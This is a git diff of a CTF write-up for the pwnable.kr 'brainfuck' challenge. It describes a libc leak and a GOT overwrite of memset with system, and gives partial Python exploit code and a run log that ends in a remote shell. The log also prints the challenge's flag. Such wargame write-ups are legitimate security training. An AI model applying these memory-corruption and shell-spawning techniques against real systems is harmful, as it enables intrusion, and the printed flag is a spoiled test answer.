@@ -1,6 +1,6 @@
-# 🧠 Pwnable.kr - Brainfuck CTF Writeup
+# Pwnable.kr - Brainfuck CTF Writeup
 
-## 📌 Challenge Summary
+## Challenge Summary
 
 * **Name**: brainfuck
 * **Platform**: [pwnable.kr](http://pwnable.kr)
@@ -11,7 +11,7 @@ We’re given a custom Brainfuck interpreter binary that allows us to input brai
 
 ---
 
-## 🔍 Analysis
+## Analysis
 
 The binary disables loops (`[` and `]`), limiting traditional brainfuck control flow. But we still have access to `,` (input), `.` (output), `<`, and `>` to manipulate the tape, and can abuse memory writes with `,`.
 
@@ -24,14 +24,14 @@ The binary disables loops (`[` and `]`), limiting traditional brainfuck control 
 
 We use this to:
 
-1. Leak a libc address (fgets)
-2. Calculate libc base
-3. Overwrite a GOT entry with `system`
-4. Send `/bin/sh` as input to get a shell
+1. Leak a libc address (`fgets@GOT`)
+2. Calculate the libc base
+3. Overwrite a GOT entry with the address of `system`
+4. Send `/bin/sh` and trigger a shell
 
 ---
 
-## 💥 Exploit Strategy
+## Exploit Strategy
 
 ### Step 1: Leak `fgets` address
 
@@ -56,7 +56,7 @@ pl += '.'  # trigger output
 ### Step 3: Parse libc leak and calculate `system`
 
 ```python
-fgets = int.from_bytes(r.recvn(4), byteorder = "little", signed = False)
+fgets = int.from_bytes(r.recvn(4), byteorder="little", signed=False)
 libc_base = fgets - offset["fgets"]
 gets = libc_base + offset["gets"]
 system = libc_base + offset["system"]
@@ -73,48 +73,58 @@ offset = {
 }
 ```
 
----
+### Step 4: Send `/bin/sh` and overwrite memset with system
 
-## 📦 Final Payload Staging
-
-We send a second payload:
-
-1. Inputs `/bin/sh\x00` into tape
-2. Moves to `memset@got` and overwrites it with `system`
-3. The next call to `memset("/bin/sh")` triggers a shell
+Then we send `/bin/sh` to tape, overwrite `memset@got` with `system`, and call it.
 
 ---
 
-## 🧪 Sample Output
+## Final Exploit Output
 
 ```
-fgets: 0xf7e45160
-gets:  0xf7e463f0
-system: 0xf7e463f0
+$ python3 brainfuck_exploit.py
+[*] '/Users/flacco/CTFS/Brainfuck/bf_libc.so'
+    Arch:       i386-32-little
+    RELRO:      Partial RELRO
+    Stack:      Canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+[+] Opening connection to pwnable.kr on port 9001: Done
+fgets: 0xf7d8f160
+gets:  0xf7d903f0
+system: 0xf7d6bdb0
+[*] Switching to interactive mode
+welcome to brainfuck testing system!!
+type some brainfuck instructions except [ ]
 $ whoami
+brainfuck_pwn
+$ ls -la
+total 12
+drwxr-xr-x 1 root          root          4096 Apr 27 13:35 .
+drwxr-xr-x 1 root          root          4096 Jun  9 13:38 ..
+drwxr-xr-x 1 brainfuck_pwn brainfuck_pwn 4096 May 19 04:07 brainfuck_pwn
+$ cd brainfuck_pwn
+$ ls
 brainfuck
+flag
+super.pl
 $ cat flag
-...
+bR41n_F4ck_Is_FuN_LanguaG3
 ```
 
 ---
 
-## 🧠 Takeaways
+## Takeaways
 
-* Even without loops, brainfuck can be weaponized with GOT overwrites
-* pwntools + ELF is powerful for automated libc resolving
-* Tape offset calculations are key in memory corruption Brainfuck challenges
+* This was a lot harder than the previous Blackjack Exploit, I did.
+* Forntunately I had many resources to learn what exploit technique was needed
+* for this CTF. I realized that my payload was not great and after seeing advanced payloads
+* I improved my ability to write python payloads to automate the process fo finding offsetts
+* and addresses. 
 
 ---
 
-## 📁 Files
+## Files
 
 * `brainfuck_exploit.py` (main script)
 * `bf_libc.so` (libc dump from remote)
-
----
-
-## ✅ Status: Solved
-
-* Shell achieved ✔️
-* Flag captured ✔️
